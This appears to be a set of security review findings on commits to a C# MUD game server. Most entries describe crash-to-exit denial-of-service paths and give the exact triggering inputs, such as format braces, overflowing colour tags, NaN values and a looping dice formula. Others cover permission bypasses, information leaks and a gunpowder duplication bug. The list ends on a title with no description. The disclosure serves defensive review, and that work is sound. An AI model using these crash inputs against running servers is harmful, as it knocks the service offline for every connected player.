description: In the non-language MindBroadcast path, the patch now builds an Emote raw string by interpolating the player's broadcast text into quoted speech. That text is not escaped for .NET composite-format braces. The newly used Emote constructor passes PermitLanguageOptions.IgnoreLanguage, and ScoutTargets leaves quoted speech unchanged in that mode. Later, PlayerOutputHandler sends the output by calling output.ParseFor, which reaches Emote.ParseFor and calls string.Format(RawText, parsedTokens). A player who can invoke this power can therefore submit a broadcast such as `{` or `{999}`; the malformed format item remains in RawText and string.Format throws. In release builds the top-level server catch logs the crash and exits, making this an authenticated availability vulnerability for worlds where ordinary players can use MindBroadcast.

title: Rethrown DB save errors enable privileged server DoS
description: Cell overlay package creation accepts the remaining command text as the package name without checking it against the database column limit. The CellOverlayPackages.Name column is varchar(4000). Supplying a name longer than that causes EF/MySQL to raise a DbUpdateException during SaveChanges. Before this commit, the constructor caught that exception and only logged it; this commit adds a rethrow. There is no local command exception boundary, so the exception can propagate to the top-level Main handler, which writes a crash log and then unconditionally calls Environment.Exit(0). The affected command requires PermissionLevel.Admin, so this is a high-privilege authenticated availability issue rather than an unauthenticated remote DoS. The same rethrow pattern was also added to Body.Save, making body persistence DbUpdateExceptions fatal as well.

title: Sheaths can be emptied from other players without consent
description: SheathGameItemComponent now implements IContainer and supplies Contents and Empty implementations. Existing inventory interactions such as TAKE from another character's container explicitly require target.WillingToPermitInventoryManipulation(actor), but the generic Empty command accepts any targeted IContainer and only checks actor.Location.CanGetAccess(target, actor). Because Character.TargetItem supports targeting another character's exposed items with syntax such as victim@sheath, an authenticated player can use EMPTY on another character's visible sheath even when that character is not helpless, an ally, or otherwise willing to permit inventory manipulation. The new Sheath.Empty implementation then clears Content and inserts the weapon into the room or another container. This creates an unauthorized in-game item manipulation/disarming path introduced by treating sheaths as generic containers without ensuring the generic container command enforces the same ownership checks.

title: New magic builders can persist unloadable powers
description: The new builder loaders, for example the magicattack loader, return a newly constructed power. The constructor calls DoDatabaseInsert(), which serializes the row with PowerModel = PowerType. For MagicAttackPower, PowerType is "Magic Attack", but the registered loader key is "magicattack". MagicPowerFactory.LoadPower later indexes a case-sensitive Dictionary<string,...> directly with power.PowerModel, so a persisted row with "Magic Attack" has no matching loader and will throw during magic power loading. The same pattern applies to the other newly added builder loaders with human-readable PowerType values. Because the in-game magic command is Admin-gated, this is not an unauthenticated issue, but a malicious or compromised Admin account can persistently break server startup by creating one of these new power types.

title: Variable NPC SHOW can crash server on NaN skill values
description: Variable NPC skill means and standard deviations are accepted with double.TryParse and are not checked for NaN or Infinity. The commit changed VariableNPCTemplate.Show to pass the mean and computed min/max values into skill.Trait.Decorator.Decorate(...). For range-based trait decorators, Decorate(double) calls RankedRange.Find(value). With NaN, all numeric comparisons in FindRange are false, so it returns null and Find dereferences .Value, causing a NullReferenceException. In production builds, PlayerConnection.AttemptCommand catches command exceptions, writes a crash log, and calls Environment.Exit(0), so a JuniorAdmin who can edit/show NPC templates can remotely terminate the MUD server.

title: Admin magic builder can crash server with bad interval
description: This commit adds a resistinterval subcommand for mind anesthesia powers. It validates the argument only with double.TryParse and a <= 0 check. In .NET, values such as "NaN" and "Infinity" can parse successfully and are not caught by the <= 0 branch, so they reach TimeSpan.FromSeconds(value), which throws. Player command exceptions are caught in PlayerConnection.AttemptCommand, logged as a crash, and then Environment.Exit(0) is called. The magic builder command is gated at PermissionLevel.Admin, so this is not remotely exploitable by normal players, but it gives any Admin-level staff account a one-command denial of service despite shutdown being a higher SeniorAdmin permission elsewhere.

title: Admin-created LiquidMixture register variable crashes saves
description: FutureProg.GetTypeByName now accepts "liquidmixture". Admin-level staff can therefore run a register command such as `register character crashvar liquidmixture`. The register command accepts the parsed variable type and calls RegisterVariable. RegisterVariable marks a default value as changed for all registered variables, but because LiquidMixture is classified as a ValueType and the ValueType switch has no LiquidMixture case, no `_defaultValues[ownerType][variable]` entry is created. On the next save, VariableRegister.Save assumes the default entry exists and indexes it directly, throwing a KeyNotFoundException. In normal builds the SaveManager flush path does not catch this exception, so it can terminate the main game loop or disrupt service. This is only reachable by Admin-privileged users, not unauthenticated players.

title: Blood show subcommands lack admin authorization
description: The top-level `show` command is registered as a normal player command and has no `CommandPermission`, which defaults it to `PermissionLevel.Any`. This commit adds `show popbloodmodels`, `show bloodmodels`, `show bloodantigens`, and `show bloodtypes` dispatch cases before any authorization check, and the newly added handler methods do not call `actor.IsAdministrator()` or otherwise validate permissions. The same commands are added only to `AdminShowDefaultText`, not to the player help text, indicating they were intended as admin/builder information. As a result, any logged-in player who knows or guesses the subcommand can enumerate blood antigens, blood types, blood models, and exact population blood type weights, potentially revealing hidden race/ethnicity or health-system mechanics.

title: Cycleable fluid counts-as chains can crash breathing checks
description: Gas and liquid counts-as relationships are followed recursively by the newly added IFluid methods without any visited-set, depth limit, or cycle validation. The existing builder commands allow an Admin-level builder to set a gas or liquid to count as any other gas/liquid, including itself or a cycle such as A -> B -> A. Race.CanBreatheFluid now calls these recursive methods while evaluating breathable fluids, and BreathingRate calls CanBreatheFluid. If a cyclic counts-as chain is queried for a target outside the cycle, recursion never terminates. In .NET, StackOverflowException is generally not recoverable and can terminate the MUD server process, causing a denial of service for all connected players. The attack requires privileged builder/admin access or malicious imported world data, so the severity is limited, but it is a server availability issue introduced by this commit's new recursive breathing path.

title: Malformed RGB colour in morph emote can crash server
description: The changed Morph path now calls Prototype.MorphEmote.SubstituteANSIColour() immediately before emitting the morph emote. MorphEmote is set from the remaining builder command argument without validating colour tokens. SubstituteANSIColour matches RGB colour markup with unlimited numeric components, then calls int.Parse on each component. A JuniorAdmin/builder can set a morph emote such as "$0 #`999999999999999999999;0;0; morphs$.". When the item morph schedule fires, int.Parse throws OverflowException. Scheduler.CheckSchedules does not catch exceptions around schedule.Fire(), and the production top-level handler catches the exception, writes a crash log, and exits the process, causing a denial of service. The underlying parser weakness existed before, but this commit introduced this parser into the item morph scheduler path.

title: Dragged characters' pending movement is not cancelled
description: Character.Teleport now moves dragged characters/helpers along with the primary teleported character. The primary character's movement is cancelled correctly, but inside the loop for otherMovers the code calls `Movement?.CancelForMoverOnly(mover)`, which resolves to `this.Movement` rather than `mover.Movement`. Since the primary character's movement was already cancelled at the start of Teleport, this is usually a no-op and any pending movement on the dragged/helper character remains scheduled. Teleport then manually removes that mover from its current location and inserts it into the teleport destination. When the stale movement later executes, it uses the old exit's origin/destination, leaving/removing from the old origin and entering the old destination even though the character is already elsewhere. This can desynchronise the character's Location property and cell membership, potentially duplicating presence across rooms or causing later event/visibility/state corruption. A player-triggered teleportall-style prog or staff transfer/teleport path involving a dragged/helper character with pending movement could expose this as a world-integrity and availability issue.

title: Preserved item register values can crash saves
description: When PreserveRegisterVariables is enabled on an item prototype, LoadDestroyedItem and LoadMorphedItem now iterate over all registered Item variables and call SetValue on the newly-created item. This is broader than copying only variables that actually have safe values. VariableRegister.SetValue accepts the result of its internal GetValue conversion without checking for null. For variable types that VariableRegister explicitly cannot serialize, such as Exit, Chargen, and Effect, GetValue returns null. SetValue stores that null in _values and marks the register changed. During the next save, VariableRegister.Save dereferences value.SaveToXml(), which will throw a NullReferenceException and can stop the save loop/server. A normal player could trigger this if gameplay lets them destroy or morph a preserve-enabled item in a world where such an item register variable exists; builders/staff can also accidentally create this condition.

title: Invalid craft phase durations can be persisted and crash runtime
description: This commit changed craft phases from storing TimeSpan values to storing raw double seconds in CraftPhase. The add/edit commands still only validate with double.TryParse, which accepts non-finite and out-of-range values such as NaN, Infinity, and 1e300. Before this refactor, those values were converted to TimeSpan during the build command and would not be stored as phase data. Now they are saved into _craftPhases and CraftIsValid does not reject them. Later, craft display and craft execution convert the stored double back with TimeSpan.FromSeconds, which throws ArgumentException or OverflowException for these values. A staff user with craft-editing access can therefore create a malformed craft that crashes review/show paths or, if approved/current, crashes when a craft phase is handled.

title: Malformed colour tag can crash the MUD server
description: Character full descriptions can come from custom chargen descriptions or staff-edited descriptions and are persisted on the Body. This commit changed DescriptionType.Full rendering to call SubstituteANSIColour before optionally stripping ANSI. SubstituteANSIColour matches RGB colour tags with unbounded digit groups and parses each group with int.Parse. Values outside Int32 range throw OverflowException. Since LOOK renders thing.HowSeen(..., DescriptionType.Full), a crafted persisted character description containing an overflowing RGB tag will throw when the character is examined. PlayerConnection catches command exceptions, writes a crash log, and calls Environment.Exit(0), making this a service-wide denial of service rather than a single-command failure. The parsing occurs before StripANSIColour, so no-colour contexts are also affected.

title: New armour power builder persists unloadable XML
description: This commit registers a builder loader for the armour magic power and adds a constructor that immediately calls DoDatabaseInsert(). However, SaveDefinition() still does not serialize MinimumSuccessThreshold, even though the load constructor treats that element as mandatory and throws if it is absent. As a result, creating an armour power through the newly registered builder path writes malformed-but-accepted data to the MagicPowers table. The running server may continue with the in-memory object, but the next reload/startup will enumerate persisted magic powers and call MagicPowerFactory.LoadPower(), causing MagicArmourPower's constructor to throw ApplicationException for the missing element. Because the magic builder command is Admin-only, exploitation requires a privileged account, but it can create a persistent availability failure until the database row is repaired or deleted.

title: Magic power builders persist unloadable powers
description: The new builder loaders make `connectmind` and `invisibility` creatable through the Admin-only `magic power edit new` flow. The constructors immediately call `DoDatabaseInsert()`, which persists `PowerModel = PowerType`. For these powers, `PowerType` is `Connect Mind` or `Invisibility`, while the runtime loaders are registered under lowercase builder keys such as `connectmind` and `invisibility`. `MagicPowerFactory.LoadPower` later indexes the case-sensitive `PowerLoaders` dictionary with the persisted `power.PowerModel`, so a newly created power is not loadable after restart. The newly creatable `InvisibilityPower` also serializes `ConnectVerb`/`DisconnectVerb` and omits `MinimumSuccessThreshold`, while its load constructor requires `StartPowerVerb`, `EndPowerVerb`, and `MinimumSuccessThreshold`, so even if the model key were normalized the saved definition would still throw during load. A compromised or malicious Admin-level account can therefore create one of these powers and leave the game unable to start or load magic powers on the next reboot, causing persistent availability loss until the database row is manually repaired or removed.

title: CreateLiquid XML mismatch enables persistent startup DoS
description: CreateLiquidEffect's constructor and builder XML expect a LiquidId element, but SaveToXml writes Liquid instead. When a spell containing this effect is saved, MagicSpell.SaveDefinition persists that malformed effect XML to the database. On the next server load, FuturemudLoaders constructs every MagicSpell, which calls SpellEffectFactory.LoadEffect and then the CreateLiquidEffect constructor. For the persisted XML, root.Element("LiquidId") is null, and accessing .Value throws, aborting magic spell loading and likely preventing the MUD from starting. The same mismatch also makes Clone() crash immediately because it constructs from SaveToXml(). The magic editing command is available to Admin-level staff, so a compromised or malicious lower staff account with that permission can plant a persistent availability failure that only manifests on clone/reload/restart.

title: Craft products fire ItemFinishedLoading twice
description: Craft products are produced into ICraftProductData and later released via ReleaseProducts. ReleaseProducts already inserts each product into the room, fires EventType.ItemFinishedLoading, and logs the item in. This commit adds additional ItemFinishedLoading calls inside multiple ProduceProduct implementations before the products are released. As a result, a player completing a craft can cause item load hooks/components/FutureProgs to run twice for the same created item. ItemFinishedLoading is a general hookable event, so duplicate execution can duplicate side effects, run world-mutating FutureProgs twice, or double the cost of expensive load handlers. The first event is also premature because the product has not yet been inserted into its final location.

title: Configure implant power exposed phase can crash server
description: This commit adds an 'exposed' phase special that calls GetTargetBodypart(parameters) during scheduled surgery phase execution. ConfigureImplantPowerProcedure processes its arguments as [implant item 1, bodypart 1, implant item 2, bodypart 2], but the newly added GetTargetBodypart override returns (IBodypart)parameters[0]. For this procedure parameters[0] is an IGameItem, so any configured ConfigureImplantPower surgery phase using the new 'exposed' special will throw InvalidCastException when the phase runs. The scheduled effect path does not catch the exception, so in production it can bubble out to the main server crash handler and terminate the MUD process. An authenticated player who knows and can perform such a configured surgery can therefore trigger a denial of service.

title: Virtual shopper can hang on zero-price merchandise
description: SimpleShopper.DoShop builds a one-time list of purchasable items, then loops while budget is positive. The loop only filters by price <= budget and never removes a purchased item from allItems or refreshes the list from shop stock. If any candidate item has a price of 0, budget is never reduced at line 308, so the loop can run forever, repeatedly calling BuyVirtualShopper on the same item object even after it has been deleted from stock. Very small positive prices can also cause extremely large iteration counts. Because shopper execution is scheduled in the game runtime, this can block the server's main processing path when an enabled shopper visits a shop containing such merchandise.

title: Remote visibility checks use viewer lighting instead of target lighting
description: This commit introduced ICharacter.IlluminationSightDifficulty() as a no-argument helper that computes sight difficulty from Location.CurrentIllumination(this). That is correct only for checks about the character's own current location. The commit then used it in BodyPerception.CanSee, Cell.SpotDifficulty, and RangedWeaponAttackBase where the previous code evaluated thing.Location, the Cell instance, or target.Location. As a result, if an attacker stands in a lit room and scans or attacks a dark adjacent/distant room, the darkness penalty of the target room is skipped. This can disclose characters/items that should be obscured by darkness and can reduce ranged attack penalties against targets in dark environments.

title: Builder-created pathing AIs can crash on combat exit
description: PathingAIWithProgTargetsBase assumes PathingEnabledProg is non-null and calls PathingEnabledProg.ExecuteBool(ch). Existing builder constructors such as AggressivePather initialise this to AlwaysFalseProg, but the newly introduced SemiAggressive builder constructor does not set it, and this commit also exposes TrackingAggressor through RegisterAIBuilderInformation even though its existing builder constructor likewise omits PathingEnabledProg. SaveToXml persists a 0 PathingEnabledProg id, so after reload the field remains null. SemiAggressiveAI.LeaveCombat falls through to base.HandleEvent(EventType.LeaveCombat, aggressor), and PathingAIBase handles LeaveCombat by calling CheckPathingEffect(..., true), which invokes IsPathingEnabled and dereferences the null PathingEnabledProg. A normal player may be able to trigger this by causing combat with an NPC using one of these newly builder-created AIs and then ending combat. The practical exploit requires an admin/builder to create or attach the affected AI, so this is best treated as a conditional availability issue rather than a universal unauthenticated DoS.

title: FutureProg can reveal stored writing text
description: This commit makes writings first-class FutureProg variables and adds lookup/argument paths for any writing ID. The new writing `.text` property calls `ParseFor(null)`. In `CompositeWriting.ParseFor`, the null-conditional checks only obscure text when `voyeur` is non-null and explicitly fails literacy/script/language checks; with null, all checks are skipped and the original quoted text is returned. `SimpleWriting.ParseFor` returns raw text regardless of reader. Combined with `towriting(id)` and `prog execute` argument resolution, a FutureProg author or staff user able to execute progs can access stored writing contents without possessing the object or satisfying the normal in-game read requirements. If such a prog is later exposed through player-triggerable hooks, it can also leak private written content to ordinary players.

title: Chargen characteristic picker can crash the server
description: The new SimpleCharacteristicsPickerScreenStoryboard randomizes every race characteristic when the screen is constructed. Random selection can return null when the ethnicity/profile has no values applicable to the current chargen template, or when data is incomplete. The initial display then unconditionally dereferences x.Value.Name for every selected characteristic. In production builds, unhandled exceptions during player input are caught by PlayerConnection and followed by Environment.Exit(0), so this becomes a game-wide availability issue rather than just a failed chargen session. The previous picker stored null selections and rendered them as 'Not Selected', so this crash path is introduced by the new simple picker.

title: Unbounded dice formula in new Wound prog function
description: WoundFunction validates text damage formulas only with Dice.IsDiceExpression and then synchronously calls Dice.Roll. The dice validator is syntactic and does not reject pathological but valid-looking expressions. In Dice.Roll, an exploding dice modifier decrements the loop counter whenever the roll is greater than or equal to the explosion threshold. A formula like "1d1 e1" is accepted, always rolls 1, always satisfies the explosion condition, and therefore never terminates. Very large dice counts can also force excessive CPU work. Because FutureProgs execute synchronously in the MUD runtime, an Admin-level prog author, or a player-triggered prog that passes user-controlled text into Wound, can block the game loop and cause denial of service. The underlying Dice.Roll behavior was pre-existing, but this commit introduces a new FutureProg sink that exposes it through Wound.

title: Clan remove bypasses intended Admin permission check
description: The commit adds `clan remove rank|paygrade|appointment` and appears to intend that only PermissionLevel.Admin+ staff or clan members with the relevant clan-building privilege may use it. However, each authorization check is written as `!actor.IsAdministrator(PermissionLevel.Admin) && actorMembership != null && !actorMembership.NetPrivileges.HasFlag(...)`. If the actor is not an Admin but also has no membership in the edited clan, `actorMembership != null` is false and the denial block is skipped. This is reachable because clan editing can be entered by any character for whom `IsAdministrator()` is true at its default JuniorAdmin threshold, and admin users can target all clans. As a result, a JuniorAdmin with admin sight active can `clan edit <any clan>` and then use the new remove commands despite not meeting the intended Admin-level check. A former clan member who retains a builder editing effect after being removed from the clan may also bypass the clan-membership privilege checks. The fix should make the non-Admin branch deny when there is no valid membership, e.g. `if (!actor.IsAdministrator(PermissionLevel.Admin) && (actorMembership == null || !actorMembership.NetPrivileges.HasFlag(...)))`, and should clear clan editing effects when membership or relevant privileges are revoked.

title: Bulky wear check can crash the MUD process
description: The new bulky-item logic iterates items returned by wearer.WornItemsFor(location.Key), but WornItemsFor does not only return exact wearloc matches; it returns items where the requested bodypart CountsAs the stored worn location. The new code then calls WornItemsFullInfo.First with an exact x.Wearloc == location.Key predicate. If a body has count-as wear locations and an existing bulky item is worn on the counted-as/generic location, attempting to wear another bulky item on the specific location can make WornItemsFor return that existing item while the exact First lookup has no matching tuple, raising InvalidOperationException. Player command exceptions are caught in PlayerConnection.AttemptCommand and immediately call Environment.Exit(0), turning this into a process-wide availability issue for affected worlds.

title: Role skill display leaks hidden skills in chargen
description: The new RoleSkills collection is populated from selected roles' trait adjustments and excludes only skills already in FreeSkills. Unlike the existing free-skill display, it does not apply an x.Hidden filter before rendering the skill names. A low-privileged player in character creation can select available roles and reach the skill picker/cost picker screens to view the names of hidden skills granted by those roles. Hidden traits are otherwise intended to be concealed from normal player skill displays, so this is an information disclosure of game mechanics/secret role capabilities. The impact is limited to confidentiality of hidden in-game skill names and does not provide account, privilege, integrity, or availability impact.

title: Shop reprice accepts overflow multipliers causing server exit
description: The commit introduces `shop reprice`, available through the normal player `shop` command to any character who is a manager of the current shop. The command validates only that the parsed percentage is greater than zero, with no upper bound or overflow check. `Merchandise.Reprice` then multiplies `BasePrice` and `AutoReorderPrice` by the attacker-supplied decimal. Decimal multiplication throws `OverflowException` when the result exceeds `decimal.MaxValue`. In production, `PlayerConnection.AttemptCommand` catches any command exception, writes a crash log, and calls `Environment.Exit(0)`, so a single crafted command such as a very large multiplier can shut down the MUD server if the shop has merchandise with a non-trivial price.

title: NPC accent command can terminate server
description: The new two-argument accent parsing path resolves the first token as a selected language and immediately dereferences `language.Accents` without checking whether the language lookup succeeded. For example, while editing a simple NPC template, a staff user can run a command like `npc set accent nosuchlanguage anything`. `SelectedLanguages.GetByIdOrName(text)` returns null, `language.Accents` throws a NullReferenceException, and this exception is not handled inside the builder command. In production, `PlayerConnection.AttemptCommand` catches exceptions from player input, writes a crash log, and calls `Environment.Exit(0)`, stopping the MUD server. The previous code searched accents directly and returned the normal 'There is no such accent' message instead of dereferencing a null language.

title: Emote speech events bypass vocalization restrictions
description: Quoted speech in emotes is now collected as LanguageTokens and, after the emote is displayed, passed to HandleSpeechEvents as concatenated LanguageInfo.RawText. This path does not check the Emote permitSpeech argument, the token's PermitLanguageOptions, CanVocalise, or gag/state restrictions before firing CharacterSpeaks/CharacterSpeaksWitness events. As a result, a remote authenticated player can use an emote containing quoted text to trigger speech-driven hooks and items even when the command path intended speech to be disallowed or the language renderer would show the speech as gasping, muffled, or choking. Event consumers include FutureProg hooks and listening-bug components, so this can bypass in-game authorization/physical-state controls for voice-triggered mechanics and can leak the raw intended speech to event-driven systems.

title: Wear-profile null dereference can terminate the server
description: Wear profiles are allowed to return null when their mandatory bodypart or bodypart-shape requirements are not met by the wearer's body. Before this commit, Body.CanWear checked that profile.Profile(this) was not null before continuing. The new code stores the return value in `profiles` and immediately iterates it without a null check. A player who can obtain or target a wearable item/profile intended for a different body layout can issue a normal `wear` command, causing `foreach (var availableProfile in profiles)` to dereference null. In release builds, PlayerConnection catches exceptions during player input, writes a crash log, and calls Environment.Exit(0), making this a process-wide availability issue rather than only a failed command.

title: Name regex permits persistent newline injection in aliases
description: The commit changed the seeded Levantine and Morrocan name-entry regexes from a literal space after `Ibn`/`Bin`/`Bint`/`Ibnat` to `\s*`. In .NET regexes, `\s` matches more than an ASCII space, including LF, tab, vertical tab, and form feed. The MUD network parser terminates commands on carriage return but can preserve an LF byte embedded before the CR, so an authenticated player can submit an alias such as `Ahmed Bin\nAli Smith` for these cultures. `AliasAdd` passes the raw remaining argument to `GetPersonalName`, and `GetPersonalName` now stores single-count captured elements unchanged. `PersonalName.GetName` does not remove embedded LF/control whitespace before names are displayed or persisted into dubs during `introduce`. This permits persistent line/terminal/log spoofing through player names for affected seeded cultures. The regex should use a literal printable-space class such as `[ ]*` or `[ ]?`, and name parsing should reject or normalize all control characters before persistence.

title: Drug editor can persist startup-crashing drug effects
description: This commit exposes drug creation/editing through a new network-reachable Admin command and adds builders for list-based drug effect metadata such as neutralised drug types, bodypart damage types, specific drug IDs, and magic capability IDs. Those metadata objects serialize their integer IDs with the fixed-point format string "F", producing values such as "1.00", and empty lists serialize to an empty string. On load, Drug.AdditionalInfoFor parses the same fields with int.Parse/long.Parse after splitting on spaces. Both "1.00" and "" throw FormatException. As a result, an Admin can create or edit a drug with one of these effect types, allow it to save, and the server will fail while loading drugs on the next restart. This is a persistent availability issue caused by the newly introduced editing path using an incompatible pre-existing serializer/parser pair.

title: Null NPC name profile can crash server on NPC load
description: VariableNPCTemplate.LoadFromXml now uses FirstOrDefault when resolving the saved NameProfile/Profile id. If the referenced random name profile is missing from that name culture, null is inserted into _nameProfiles. The rest of the class does not handle null values: CanSubmit only checks that a gender key exists, Show and SaveDefinition dereference profile.Value, and CharacterTemplate dereferences _nameProfiles[rolledGender]. A current NPC template with a stale Profile id can therefore throw NullReferenceException when a JuniorAdmin runs npc load/show/clone/save or when an NPC spawner uses the template. In production command handling, exceptions during player input are logged and then Environment.Exit(0) is called, making this an availability issue for the whole service.

title: Musket loading allows gunpowder duplication
description: The commit introduces InventoryPlanActionConsumeCommodity for musket powder loading. Its ScoutTarget predicates are missing parentheses, so for untagged commodities the weight check is not applied: any untagged commodity with the requested material is accepted even if it weighs less than the requested amount. The musket powder template requests GunpowderMaterial with no desired tag, so a player can satisfy the load plan with a tiny amount of gunpowder. ConsumeCommodity then deletes the undersized commodity as though the requested amount was consumed, and MusketGameItemComponent.Load creates a new full PowderVolumePerShot gunpowder commodity inside the musket. Because Unload returns magazine contents to the room, a player can load with a tiny quantity and unload a full charge, duplicating gunpowder and bypassing ammunition/resource costs.

title: Shop preview leaks closed container contents
